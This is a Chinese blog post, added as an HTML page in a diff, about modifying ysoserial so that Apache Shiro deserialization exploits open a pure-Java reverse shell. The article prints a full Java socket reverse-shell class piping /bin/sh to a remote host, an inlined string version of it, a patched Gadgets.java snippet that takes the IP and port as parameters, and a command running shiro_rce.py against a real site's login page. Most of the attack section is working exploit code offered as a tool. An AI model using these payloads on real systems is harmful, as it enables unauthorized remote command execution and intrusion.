@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#d8f3ff">
+<title>JAVA4-改写ysoserial解决常规shell失效问题</title>
+
+  <style>
+    :root { --wallpaper: url("/images/wallpaper.jpg"); }
+  </style>
+
+<link rel="stylesheet" href="/css/main.css">
+<script defer src="/js/main.js"></script>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+<body class="theme-mac js is-article-page has-wallpaper">
+  <div class="menu-bar">
+  <div class="menu-left">
+    <div class="menu-apple" id="menu-apple">
+      <button class="menu-apple-btn" id="menu-apple-btn" type="button" aria-haspopup="true" aria-expanded="false" aria-label="Apple">
+        <svg class="menu-apple-icon" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M16.36 2.2c0 1.05-.43 2.06-1.15 2.8-.8.83-2.12 1.47-3.25 1.39-.13-1.11.34-2.2 1.1-2.95.75-.81 2.06-1.42 3.3-1.24z"/>
+          <path d="M19.2 8.3c-.97-1.23-2.32-1.95-3.59-1.95-1.69 0-2.4.81-3.58.81-1.21 0-2.12-.79-3.6-.79-1.43 0-2.95.87-3.92 2.36-1.37 2.1-1.13 6.05 1.08 9.42.8 1.21 1.86 2.57 3.23 2.56 1.19-.01 1.53-.76 3.2-.76 1.67 0 1.98.76 3.19.75 1.41-.01 2.55-1.51 3.33-2.72.58-.89.8-1.34 1.24-2.35-3.26-1.24-3.78-5.87-.58-7.33z"/>
+        </svg>
+      </button>
+      <div class="menu-dropdown" id="menu-apple-dropdown" role="menu">
+        <button class="menu-dropdown-item" type="button" data-open="about">关于本机</button>
+        <div class="menu-divider"></div>
+        <button class="menu-dropdown-item" type="button">系统设置...</button>
+        <button class="menu-dropdown-item" type="button">App Store...</button>
+        <div class="menu-divider"></div>
+        <button class="menu-dropdown-item" type="button">关机...</button>
+      </div>
+    </div>
+    <span class="menu-item brand">Finder</span>
+    <span class="menu-item">File</span>
+    <span class="menu-item">Edit</span>
+    <span class="menu-item">View</span>
+    <span class="menu-item">Go</span>
+    <span class="menu-item">Window</span>
+    <span class="menu-item">Help</span>
+  </div>
+  <div class="menu-right">
+    <span class="menu-item status icon" aria-label="WeChat" title="WeChat">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M8.5 6.5c-3.2 0-5.8 2.1-5.8 4.8 0 1.7 1 3.3 2.6 4.2l-.6 2.3 2.3-1.2c.5.1 1 .2 1.5.2 3.2 0 5.8-2.1 5.8-4.8S11.7 6.5 8.5 6.5z"/>
+        <path d="M15.5 11c3.1 0 5.7 2.1 5.7 4.7 0 1.5-.8 2.9-2.2 3.8l.5 2-2.1-1.1c-.4.1-.9.1-1.4.1-3.1 0-5.7-2.1-5.7-4.7S12.4 11 15.5 11z"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="QQ" title="QQ">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M7 18c-1.4 0-2.6 1-2.6 2.3 0 1.1 1 2.1 2.6 2.1h10c1.6 0 2.6-1 2.6-2.1 0-1.3-1.2-2.3-2.6-2.3"/>
+        <path d="M6.5 12.5c-1.2 2.1-1.7 4.2-1.7 5.5M17.5 12.5c1.2 2.1 1.7 4.2 1.7 5.5"/>
+        <path d="M12 4.2c-3.6 0-6.5 3-6.5 6.7 0 3.7 2.9 6.7 6.5 6.7s6.5-3 6.5-6.7c0-3.7-2.9-6.7-6.5-6.7z"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Bluetooth" title="Bluetooth">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M7 6l10 10-5 4V4l5 4-10 10"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Wi-Fi" title="Wi-Fi">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M3.5 9.5a12 12 0 0 1 17 0"/>
+        <path d="M6.8 12.8a7.2 7.2 0 0 1 10.4 0"/>
+        <path d="M10.4 16.4a2.6 2.6 0 0 1 3.2 0"/>
+        <circle cx="12" cy="19" r="1.2" fill="currentColor" stroke="none"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Battery" title="Battery">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <rect x="3" y="7.5" width="16" height="9" rx="2"/>
+        <rect x="19" y="10" width="2" height="4" rx="1"/>
+        <rect x="5.2" y="9.6" width="11.4" height="4.8" rx="1.2" fill="currentColor" stroke="none"/>
+      </svg>
+    </span>
+    <span class="menu-item" id="menu-time">--:--</span>
+  </div>
+</div>
+
+
+  <main class="desktop">
+    <div class="window wide reveal" style="--delay: 120ms;">
+      <div class="window-bar">
+        <div class="traffic">
+          <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+          <span class="traffic-dot yellow"></span>
+          <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+        </div>
+        <div class="window-title">JAVA4-改写ysoserial解决常规shell失效问题</div>
+        <div class="window-actions">
+          <a class="window-link" href="/">Desktop</a>
+          
+          
+            <a class="window-link" href="/2020/06/17/%E6%B5%8B%E8%AF%95/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener">Share</a>
+          
+        </div>
+      </div>
+      <div class="window-body">
+        
+        <div class="article-head">
+          <h1 class="article-title">JAVA4-改写ysoserial解决常规shell失效问题</h1>
+          
+            <div class="article-meta">2020-06-17</div>
+          
+        </div>
+        <article class="markdown">
+          <p>最近项目中碰到了两个shiro反序列化，能出网反弹shell失败的情况，和公司师傅请教了一下，豁然开朗，修改了一下ysoserial的一些源码，也成功打通了<br>改动的仓库<a target="_blank" rel="noopener" href="https://github.com/Kit4y/shuyu-ysoserial">https://github.com/Kit4y/shuyu-ysoserial</a><br>打包版本<a target="_blank" rel="noopener" href="https://github.com/Kit4y/Awesome_shiro/tree/master/shiro_shuyu">https://github.com/Kit4y/Awesome_shiro&#x2F;tree&#x2F;master&#x2F;shiro_shuyu</a></p>
+<h2 id="为什么之前打不通？"><a href="#为什么之前打不通？" class="headerlink" title="为什么之前打不通？"></a>为什么之前打不通？</h2><p>两次项目均是这种情况，可以出网，可以反弹shell,但是命令执行就是没有回显</p>
+<span id="more"></span>
+
+
+<p><img src="/2020/06/17/%E6%B5%8B%E8%AF%95/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/1.png"></p>
+<p>在前文中，我们捋了一下yso项目的结构<a href="/2020/05/29/java-dai-ma-shen-ji-ru-men-3-ysoserial-diao-shi-he-gou-zao-urldns-de-pop-lian/">JAVA3-ysoserial调试和构造URLDNS的pop链</a>,再看一下yso的项目框架</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">│  GeneratePayload.java &#123;&#123;生成poc的入口函数&#125;&#125;</span><br><span class="line">│  Deserializer.java &#123;&#123;反序列化模块&#125;&#125;</span><br><span class="line">│  Serializer.java &#123;&#123;序列化模块&#125;&#125;</span><br><span class="line">│  Strings.java &#123;&#123;字符处理模块&#125;&#125;</span><br><span class="line">│</span><br><span class="line">├─exploit &#123;&#123;一些直接调用的exp&#125;&#125;</span><br><span class="line">│      JBoss.java</span><br><span class="line">│      JenkinsCLI.java</span><br><span class="line">│      JenkinsListener.java</span><br><span class="line">│      ......</span><br><span class="line">│ </span><br><span class="line">├─payloads &#123;&#123;生成gadget poc的代码&#125;&#125;</span><br><span class="line">│  │  CommonsBeanutils1.java</span><br><span class="line">│  │  URLDNS.java</span><br><span class="line">│  │  .....</span><br><span class="line">│  │</span><br><span class="line">│  ├─annotation &#123;&#123;一些不重要的配置&#125;&#125;</span><br><span class="line">│  │      Authors.java</span><br><span class="line">│  │</span><br><span class="line">│  └─util  &#123;&#123;一些重复使用的单元&#125;&#125;</span><br><span class="line">│          ClassFiles.java</span><br><span class="line">│          Gadgets.java</span><br><span class="line">│</span><br><span class="line">└─secmgr &#123;&#123;和安全有关的管理&#125;&#125;</span><br><span class="line">        DelegateSecurityManager.java</span><br><span class="line">        ExecCheckingSecurityManager.java</span><br></pre></td></tr></table></figure>
+<p>通过点追踪，我们找命令执行的拼接片段在ysoserial\payloads\util\ Gadgets.java<br><img src="/2020/06/17/%E6%B5%8B%E8%AF%95/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/4.png"><br>命令是通过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String cmd=<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">            command.replaceAll(<span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;\\\\\\\\&quot;</span>).replaceAll(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) + <span class="string">&quot;\&quot;);&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>也就是<a target="_blank" rel="noopener" href="https://github.com/Kit4y/shuyu-ysoserial/blob/master/src/main/java/ysoserial/payloads/util/Gadgets.java">https://github.com/Kit4y/shuyu-ysoserial/blob/master/src/main/java/ysoserial/payloads/util/Gadgets.java</a>这里的120行左右<br>拼接，然后作者在代码上注释了一行有意思的话</p>
+<blockquote>
+<p>&#x2F;&#x2F; TODO: could also do fun things like injecting a pure-java rev&#x2F;bind-shell to bypass naive protections</p>
+</blockquote>
+<p>很明白了，我们可以改成自己的纯java的片段，简直为所欲为，所以我们也打算对他下手了。</p>
+<h2 id="java原生Socket-shell"><a href="#java原生Socket-shell" class="headerlink" title="java原生Socket_shell"></a>java原生Socket_shell</h2><p>这个不多说网上都有,这里为了反序列化，将所有的函数写上完整的包路径，比如java.net.Socket,java.io.IOException</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">rce</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> java.io.IOException, InterruptedException &#123;</span><br><span class="line">        String host=<span class="string">&quot;XXX.XXX.XXX.XXX&quot;</span>;</span><br><span class="line">        <span class="type">int</span> port=<span class="number">7777</span>;</span><br><span class="line">        String cmd=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">        Process p=<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).redirectErrorStream(<span class="literal">true</span>).start();</span><br><span class="line">        java.net.Socket s=<span class="keyword">new</span> <span class="title class_">java</span>.net.Socket(host,port);</span><br><span class="line">        java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();</span><br><span class="line">        java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();</span><br><span class="line">        <span class="keyword">while</span>(!s.isClosed()) &#123;</span><br><span class="line">            <span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                so.write(pi.read());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                so.write(pe.read());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                po.write(si.read());</span><br><span class="line">            &#125;</span><br><span class="line">            so.flush();</span><br><span class="line">            po.flush();</span><br><span class="line">            Thread.sleep(<span class="number">50</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                p.exitValue();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        p.destroy();</span><br><span class="line">        s.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以编译运行一下测试<br><img src="/2020/06/17/%E6%B5%8B%E8%AF%95/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/2.png"></p>
+<h2 id="植入代码问题-如果只看结果可以跳过这一段"><a href="#植入代码问题-如果只看结果可以跳过这一段" class="headerlink" title="植入代码问题(如果只看结果可以跳过这一段)"></a>植入代码问题(如果只看结果可以跳过这一段)</h2><p>因为这是java,理论上直接讲我们socket的shell换行符删除，应该就能直接运行<br>于是将cmd改成暂时写死的的反弹shell代码片</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=&quot; String host=\&quot;XXX.XXX.XXX.XXX\&quot;;int port=7777;String cmd=\&quot;/bin/sh\&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();java.net.Socket s=new java.net.Socket(host,port);java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) &#123;while(pi.available()&gt;0) &#123;so.write(pi.read());&#125;while(pe.available()&gt;0) &#123;so.write(pe.read());&#125;while(si.available()&gt;0) &#123;po.write(si.read());&#125;so.flush();po.flush();try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();&quot;</span><br></pre></td></tr></table></figure>
+<p>果不其然直接报错<br><img src="/2020/06/17/%E6%B5%8B%E8%AF%95/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/5.png"><br>看了很久这个报错，问了一下师傅（Orz长亭师傅是真的顶<br>原因在ProcessBuilder的构造<br>报错说<code>[source error] cannot find constructor java.lang.ProcessBuilder(java.lang.String)</code>意味着字符串当参数就不能反序列化了，我们查看ProcessBuilder源码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Constructs a process builder with the specified operating</span></span><br><span class="line"><span class="comment">    * system program and arguments.  This is a convenience</span></span><br><span class="line"><span class="comment">    * constructor that sets the process builder&#x27;s command to a string</span></span><br><span class="line"><span class="comment">    * list containing the same strings as the &#123;<span class="doctag">@code</span> command&#125;</span></span><br><span class="line"><span class="comment">    * array, in the same order.  It is not checked whether</span></span><br><span class="line"><span class="comment">    * &#123;<span class="doctag">@code</span> command&#125; corresponds to a valid operating system</span></span><br><span class="line"><span class="comment">    * command.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> command a string array containing the program and its arguments</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ProcessBuilder</span><span class="params">(String... command)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.command = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(command.length);</span><br><span class="line">    <span class="keyword">for</span> (String arg : command)</span><br><span class="line">        <span class="built_in">this</span>.command.add(arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>原来这里应该改成字符串数组，于是我们可以把<code> String cmd=&quot;/bin/sh&quot;;</code>改成<code>String[] cmd=new String[]&#123;\&quot;/bin/sh\&quot;&#125;</code>(军先师傅tql,<br>还有一个是Thread.sleep(50);也报错了，我们先直接删除</p>
+<p>然后重新mvn打包-生成ysoserial.jar打一下试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jar ：mvn clean install -Dmaven.test.skip=true</span><br><span class="line">war：mvn clean package -Dmaven.test.skip=true</span><br></pre></td></tr></table></figure>
+<p>ok-成功打通了！<br><img src="/2020/06/17/%E6%B5%8B%E8%AF%95/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/6.png"></p>
+<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>现在我们只要把ip和端口写活着即可,因为暂时不想改整体框架的内容，就直接将command改了一下-懒癌是这样的，随手一改</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> String[] cmds = command.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">String ip=cmds[<span class="number">0</span>];</span><br><span class="line">String port=cmds[<span class="number">1</span>];</span><br><span class="line">String cmd=<span class="string">&quot;String host=\&quot;&quot;</span>+ip+<span class="string">&quot;\&quot;;int port=&quot;</span>+port+<span class="string">&quot;;String[] cmd=new String[]&#123;\&quot;/bin/sh\&quot;&#125;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();java.net.Socket s=new java.net.Socket(host,port);java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) &#123;while(pi.available()&gt;0) &#123;so.write(pi.read());&#125;while(pe.available()&gt;0) &#123;so.write(pe.read());&#125;while(si.available()&gt;0) &#123;po.write(si.read());&#125;so.flush();po.flush();try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();&quot;</span>;    </span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://github.com/Kit4y/Awesome_shiro/tree/master/shiro_shuyu">https://github.com/Kit4y/Awesome_shiro&#x2F;tree&#x2F;master&#x2F;shiro_shuyu</a><br>尝试运行一下<br><code>python3 shiro_rce.py http://www.baidu.com/login.do &quot;xxx.xxx.xx.xx 7777&quot;</code><br><img src="/2020/06/17/%E6%B5%8B%E8%AF%95/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/7.png"></p>
+<h2 id="感触"><a href="#感触" class="headerlink" title="感触"></a>感触</h2><p>学习java项目，研究源码是最直接最深触的学习途径，比去什么垃圾教程上看好多了。不仅可以看到项目如何跑，还能膜一下大佬们怎么写优雅的代码。通过修改源码改成自己顺手的工具也是一个不错的学习过程。Orz长亭师傅tql</p>
+
+        </article>
+      </div>
+    </div>
+  </main>
+
+  <section id="about" class="about-window">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+      <div class="window-title">关于本机</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+      </div>
+    </div>
+    <div class="window-body about-body">
+      <div class="about-card">
+        <div class="about-brand">
+          <div class="about-logo">
+            <svg viewBox="0 0 24 24" aria-hidden="true">
+              <path d="M16.36 2.2c0 1.05-.43 2.06-1.15 2.8-.8.83-2.12 1.47-3.25 1.39-.13-1.11.34-2.2 1.1-2.95.75-.81 2.06-1.42 3.3-1.24z"/>
+              <path d="M19.2 8.3c-.97-1.23-2.32-1.95-3.59-1.95-1.69 0-2.4.81-3.58.81-1.21 0-2.12-.79-3.6-.79-1.43 0-2.95.87-3.92 2.36-1.37 2.1-1.13 6.05 1.08 9.42.8 1.21 1.86 2.57 3.23 2.56 1.19-.01 1.53-.76 3.2-.76 1.67 0 1.98.76 3.19.75 1.41-.01 2.55-1.51 3.33-2.72.58-.89.8-1.34 1.24-2.35-3.26-1.24-3.78-5.87-.58-7.33z"/>
+            </svg>
+          </div>
+          <div class="about-title">MacBook Pro</div>
+          <div class="about-sub">16-inch, 2099</div>
+        </div>
+        <div class="about-specs">
+          <div class="about-row">
+            <span class="about-key">内存</span>
+            <span class="about-val">256 GB 2667 MHz DDR4</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">处理器</span>
+            <span class="about-val">Apple M9 Pro</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">显卡</span>
+            <span class="about-val">Neural X 32-Core</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">序列号</span>
+            <span class="about-val">MACF-2099-A1B2C3</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">系统</span>
+            <span class="about-val">macOS 15.2</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">主题作者</span>
+            <span class="about-val">bkfish</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+  
+
+<section id="music" class="tool-window music-window">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+      <div class="window-title">Music</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+        
+      </div>
+    </div>
+    <div class="window-body tool-body music-body">
+      
+        <div class="empty-state">
+          <div class="empty-title">未发现本地音乐</div>
+          <div class="empty-sub">把 MP3 放在 `source/music/`（或在主题配置里设置 `desktop.music_dir`）</div>
+        </div>
+      
+    </div>
+  </div>
+</section>
+
+  <section id="search" class="search-window" data-index-url="/mac-search.json">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+    <div class="window-title">聚焦搜索</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+      </div>
+    </div>
+    <div class="window-body search-body">
+      <div class="search-input-wrap">
+        <input id="search-input" class="search-input" type="search" placeholder="搜索文章..." autocomplete="off">
+        <span class="search-hint">⌘K</span>
+      </div>
+      <ul id="search-results" class="search-results"></ul>
+      <div id="search-empty" class="search-empty">未找到结果</div>
+    </div>
+  </div>
+</section>
+
+  <div class="dock">
+  <div class="dock-inner">
+    <span class="dock-item app finder">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M4 6.5c0-1.4 1.1-2.5 2.5-2.5h11c1.4 0 2.5 1.1 2.5 2.5v11c0 1.4-1.1 2.5-2.5 2.5h-11C5.1 20 4 18.9 4 17.5z"/>
+          <path d="M12 4v16"/>
+          <circle cx="9" cy="10" r="1" fill="currentColor"/>
+          <circle cx="15" cy="10" r="1" fill="currentColor"/>
+          <path d="M8.5 14.5c1 1 2.1 1.5 3.5 1.5s2.5-.5 3.5-1.5"/>
+        </svg>
+      </span>
+      <span class="dock-label">Finder</span>
+    </span>
+    <a class="dock-item app spotlight" href="#search">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <circle cx="11" cy="11" r="5.5"/>
+          <path d="M15.5 15.5L20 20"/>
+        </svg>
+      </span>
+      <span class="dock-label">聚焦搜索</span>
+    </a>
+    <a class="dock-item app notes" href="#notes">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <rect x="5" y="4.5" width="14" height="15" rx="2"/>
+          <path d="M8 8h8M8 11.5h8M8 15h5"/>
+        </svg>
+      </span>
+      <span class="dock-label">文章清单</span>
+    </a>
+    <span class="dock-item app safari">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <circle cx="12" cy="12" r="8"/>
+          <path d="M12 7l2.8 5.2-5.2 2.8z"/>
+        </svg>
+      </span>
+      <span class="dock-label">Safari</span>
+    </span>
+    <a class="dock-item app music" href="#music">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M9 18a2.5 2.5 0 1 0 0-5"/>
+          <path d="M9 13V6l9-2v7"/>
+          <path d="M16 16a2.5 2.5 0 1 0 0-5"/>
+        </svg>
+      </span>
+      <span class="dock-label">Music</span>
+    </a>
+    <span class="dock-item app trash">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M6 8h12l-1 11H7z"/>
+          <path d="M9 8V5h6v3M5 8h14"/>
+        </svg>
+      </span>
+      <span class="dock-label">Trash</span>
+    </span>
+    <span class="dock-divider"></span>
+    
+    
+      
+      <a class="dock-item tool" href="#tool-flag">
+        <span class="dock-icon">
+          <span class="tool-letter">F</span>
+        </span>
+        <span class="dock-label">flag</span>
+      </a>
+    
+      
+      <a class="dock-item tool" href="#tool-bomb">
+        <span class="dock-icon">
+          <span class="tool-letter">B</span>
+        </span>
+        <span class="dock-label">bomb</span>
+      </a>
+    
+      
+      <a class="dock-item tool" href="#tool-sudoku">
+        <span class="dock-icon">
+          <span class="tool-letter">S</span>
+        </span>
+        <span class="dock-label">sudoku</span>
+      </a>
+    
+  </div>
+</div>
+
+
+  <!-- embed resize script removed: fixed-height iframe -->
+</body>
+</html>
